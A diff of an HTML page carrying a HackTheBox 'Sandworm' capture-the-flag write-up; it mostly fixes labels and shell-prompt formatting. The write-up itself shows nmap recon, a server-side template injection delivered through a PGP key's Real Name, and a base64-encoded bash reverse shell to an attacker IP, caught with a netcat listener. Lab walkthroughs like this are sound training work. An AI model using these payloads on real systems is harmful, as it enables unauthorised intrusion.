@@ -14,7 +14,7 @@
         <nav>
             <ul>
                 <li><a href="/index.html">Home</a></li>
-                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="/writeups.html">WriteUPs</a></li>
                 <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                 <li><a href="/about.html">About me</a></li>
             </ul>
@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Sandworm</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Medium</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Sandworm</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Sandworm</h3><br/>
 Sandworm is a medium difficulty machine on HackTheBox. Firstly, we will exploit an SSTI vulnerability by abusing reflection when verifying signed PGP messages.<br/><br/>
@@ -48,7 +48,7 @@ There is a cron job executed by <code>atlas</code>. <code>Atlas</code> runs a Se
 As <code>atlas</code>, we belong to the <code>Jailer</code> group, which has the ability to execute the Set-UID binary <code>firejail</code>. This version of <code>firejail</code> is vulnerable to <code>CVE‑2022‑31214</code>, which we exploit to gain root access.<br/><br/>
 <h3><br>Recon</br></h3><br>
 First, we will conduct a port scan to discover open ports on the victim machine. For this, we will use the <code>nmap</code> tool:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.218</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.218</span>
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.218</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
 <span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">59046</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">6486</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
@@ -60,7 +60,7 @@ First, we will conduct a port scan to discover open ports on the victim machine.
 </pre></div>
 
 Understanding the open ports on the target system, our next step involves conducting a thorough scan to unveil the services and technologies operational across these ports.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">443</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span> <span class="mf">10.10.11.218</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">443</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span> <span class="mf">10.10.11.218</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.218</span> <span class="p">(</span><span class="mf">10.10.11.218</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.22</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -83,7 +83,7 @@ Understanding the open ports on the target system, our next step involves conduc
 </pre></div>
 
 Upon initial inspection, it becomes evident that there are two web services and an SSH service. Attempting to access the web service on port 80 triggers a redirection to HTTPS (443). Additionally, there is a domain that needs to be added to our <code>/etc/hosts</code> file to resolve the IP address of the target.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -97,7 +97,7 @@ Upon initial inspection, it becomes evident that there are two web services and 
 </pre></div>
 <h3><br>SSL Certificate Inspection</br></h3><br>
 Making use of <code>openssl</code>, we can examine the SSL certificate on port 443:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">connect</span> <span class="mf">10.10.11.218</span><span class="p">:</span><span class="mi">443</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">connect</span> <span class="mf">10.10.11.218</span><span class="p">:</span><span class="mi">443</span>
 </pre></div>
 
 While there may not be immediately intriguing information, it's worth noting a potential user named <code>atlas</code>.<br/><br/>
@@ -151,7 +151,7 @@ Additionally, we require the public key associated with the message. Let's copy 
 Upon clicking on <code>Verify Signature</code>, the application displays the following message:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/19.png"/><br/><br/>
 Before testing the signing functionality on the page using the <code>gpg</code> tool, we need to create some keys:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
 <span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
 <span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
 <span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>
@@ -180,15 +180,15 @@ The following message will be displayed, and if the information is correct, we e
 
 After that, simply press enter a few times until the program finishes.<br/><br/>
 Now, we need to sign a message. First, I will place some random content in a file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'This is a test'</span> <span class="o">&gt;</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'This is a test'</span> <span class="o">&gt;</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
 </pre></div>
 
 Now, let's generate the signed message using <code>gpg</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
 </pre></div>
 
 Finally, we have the signed message:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span>
 <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">PGP</span> <span class="n">SIGNED</span> <span class="n">MESSAGE</span><span class="o">-----</span>
 <span class="n">Hash</span><span class="p">:</span> <span class="n">SHA512</span>
 
@@ -210,11 +210,11 @@ Finally, we have the signed message:<br/><br/>
 </pre></div>
 
 Let's obtain our public key using the <code>--export</code> parameter. Remember to include the <code>--armor</code> parameter to obtain an ASCII text output:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
 </pre></div>
 
 Now, we can read the public key:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">public_key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">public_key</span>
 <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">PGP</span> <span class="n">PUBLIC</span> <span class="n">KEY</span> <span class="n">BLOCK</span><span class="o">-----</span>
 
 <span class="n">mQGNBGVZBLwBDADThJmQ4flcZx2f</span><span class="o">/</span><span class="n">InsglWRRVPXkb5</span><span class="o">/</span><span class="n">s3XniH</span><span class="o">+</span><span class="n">FO69sCwV1SD9J</span>
@@ -264,7 +264,7 @@ Upon clicking on <code>Verify Signature</code>, the application displays the fol
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/21.png"/><br/><br/>
 It's evident that the <code>Email</code> and the <code>Real Name</code> specified during key generation are reflected in this message. Let's attempt the Server-Side Template Injection (SSTI) once again.<br/><br/>
 I will create new keys, specifying <code>{{7*7}}</code> as the Real Name and <code>elswix1@elswix.com</code> as the Email:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
 <span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
 <span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
 <span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>
@@ -297,12 +297,12 @@ I will create new keys, specifying <code>{{7*7}}</code> as the Real Name and <co
 </pre></div>
 
 Let's encrypt the same message once again:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
 <span class="n">File</span> <span class="s1">'signed_message.txt'</span> <span class="n">exists</span><span class="o">.</span> <span class="n">Overwrite</span><span class="err">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span> <span class="n">y</span>
 </pre></div>
 
 Now, let's export the new Public Key:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix1</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
 </pre></div>
 
 Now let's fill in the fields:<br/><br/>
@@ -315,7 +315,7 @@ In <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Serv
 </pre></div>
 
 Now, let's generate new keys, specifying this payload as the Real Name and a different email:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
 <span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
 <span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
 <span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>
@@ -348,19 +348,19 @@ Now, let's generate new keys, specifying this payload as the Real Name and a dif
 </pre></div>
 
 Then, let's sign the same message again:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
 <span class="n">File</span> <span class="s1">'signed_message.txt'</span> <span class="n">exists</span><span class="o">.</span> <span class="n">Overwrite</span><span class="err">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span> <span class="n">y</span>
 </pre></div>
 
 Don't forget to export the new public key:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
 </pre></div>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/24.png"/><br/><br/>
 Upon clicking on <code>Verify Signature</code>, the page displays the following content:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/25.png"/><br/><br/>
 We're now executing system-level commands on the victim machine by exploiting the SSTI vulnerability.<br/><br/>
 Executing commands in this manner can be cumbersome, so let's send a reverse shell. Given that the standard bash reverse shell contains numerous special characters, I will encode the payload in base64:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.7/3001 0&gt;&amp;1'</span> <span class="o">|</span> <span class="n">base64</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.7/3001 0&gt;&amp;1'</span> <span class="o">|</span> <span class="n">base64</span>
 <span class="n">YmFzaCAtaSA</span><span class="o">+</span><span class="n">JiAvZGV2L3RjcC8xMC4xMC4xNi43LzMwMDEgMD4mMQo</span><span class="o">=</span>
 </pre></div>
 
@@ -369,7 +369,7 @@ The SSTI payload will be as follows:<br/><br/>
 </pre></div>
 
 Once again, let's generate new keys:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
 <span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
 <span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
 <span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>
@@ -387,16 +387,16 @@ The Real Name will be as follows:<br/><br/>
 </pre></div>
 
 After generating the keys, let's sign the message:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix3</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clearsign</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">user</span> <span class="n">elswix3</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">o</span> <span class="n">signed_message</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">a</span> <span class="n">message</span><span class="o">.</span><span class="n">txt</span>
 <span class="n">File</span> <span class="s1">'signed_message.txt'</span> <span class="n">exists</span><span class="o">.</span> <span class="n">Overwrite</span><span class="err">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span> <span class="n">y</span>
 </pre></div>
 
 Next, let's export the public key:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix3</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix3</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
 </pre></div>
 
 Before sending the information, let's set up our netcat (nc) listener on port 3001:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
@@ -405,7 +405,7 @@ Before sending the information, let's set up our netcat (nc) listener on port 30
 Now, with the information entered, let's click on <code>Verify Signature</code><br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/26.png"/><br/><br/>
 Finally, we have obtained the reverse shell:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
@@ -413,41 +413,41 @@ Finally, we have obtained the reverse shell:<br/><br/>
 <span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">lesspipe</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">dirname</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">SSA</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">SSA</span><span class="err">$</span>
 </pre></div>
 
 We have successfully obtained a shell as the user "atlas."<br/><br/>
 It appears to be a restricted shell, as certain commands like <code>whoami</code> do not seem to be available:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">whoami</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">whoami</span>
 <span class="n">whoami</span>
 <span class="n">Could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">command</span><span class="o">-</span><span class="ow">not</span><span class="o">-</span><span class="n">found</span> <span class="n">database</span><span class="o">.</span> <span class="n">Run</span> <span class="s1">'sudo apt update'</span> <span class="n">to</span> <span class="n">populate</span> <span class="n">it</span><span class="o">.</span>
 <span class="n">whoami</span><span class="p">:</span> <span class="n">command</span> <span class="ow">not</span> <span class="n">found</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 We find ourselves in a constrained shell, and unfortunately, the <code>script</code> command is not available. Therefore, we need to explore alternative methods to upgrade our shell.<br/><br/>
 Fortunately, Python3 is available, and we can leverage the <code>pty</code> module to upgrade our shell:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
 <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
